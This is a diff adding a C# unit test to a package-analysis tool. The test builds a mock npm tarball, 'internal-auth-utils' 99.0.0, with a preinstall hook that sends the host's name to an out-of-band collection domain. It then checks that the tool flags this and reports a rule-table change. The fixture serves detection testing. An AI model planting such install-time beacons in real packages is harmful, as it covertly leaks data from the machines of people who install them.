@@ -69,4 +69,36 @@ public sealed class EvidenceBundleTests(ITestOutputHelper output) : IDisposable
         Assert.Contains("0 verified, 1 differ, 1 skipped", verified);
         Assert.False(File.Exists(target));
     }
+
+    [Fact]
+    public async Task Verify_of_an_overview_made_under_another_rule_table_names_the_change_and_the_new_match()
+    {
+        var package = _dir.File("internal-auth-1.0.0.tgz");
+        using (var gz = new System.IO.Compression.GZipStream(File.Create(package), System.IO.Compression.CompressionLevel.Fastest))
+        using (var tar = new System.Formats.Tar.TarWriter(gz, System.Formats.Tar.TarEntryFormat.Ustar))
+            foreach (var (name, text) in new[]
+                     {
+                         ("package/package.json", """{"name":"internal-auth-utils","version":"99.0.0","scripts":{"preinstall":"node index.js"}}"""),
+                         ("package/index.js", "require('https').get('https://x1.oastify.com/?h='+require('os').hostname());"),
+                     })
+                tar.WriteEntry(new System.Formats.Tar.UstarTarEntry(System.Formats.Tar.TarEntryType.RegularFile, name) { DataStream = new MemoryStream(System.Text.Encoding.UTF8.GetBytes(text)) });
+        var bundle = _dir.File("older-rules.json");
+        // A record as an earlier rule table wrote it: another digest, no findings.
+        var then = System.Text.Json.JsonSerializer.Serialize(new { ruleTable = "0000000000000000", findings = Array.Empty<object>() });
+        File.WriteAllText(bundle, System.Text.Json.JsonSerializer.Serialize(new
+        {
+            format = "corvus-evidence/1", corvus = "0", created = DateTimeOffset.UtcNow,
+            records = new object[]
+            {
+                new { id = "c-1", tool = "summarize_file", arguments = System.Text.Json.JsonSerializer.Serialize(new { path = package }), inputs = Array.Empty<object>(),
+                    contentSha256 = new string('0', 64), text = "", structured = then },
+            },
+        }));
+        await using var server = await InProcessServer.StartAsync();
+        var verified = Text(await server.Client.CallToolAsync("read_result", new Dictionary<string, object?> { ["id"] = bundle, ["format"] = "verify" }));
+        output.WriteLine(verified);
+        Assert.Contains($"rules changed: rule table 0000000000000000 then, {Corvus.Services.Analysis.FindingRules.Digest} now", verified);
+        Assert.Contains("noteworthy package/collection-url at package/index.js", verified);
+        Assert.Contains("gone: none", verified);
+    }
 }
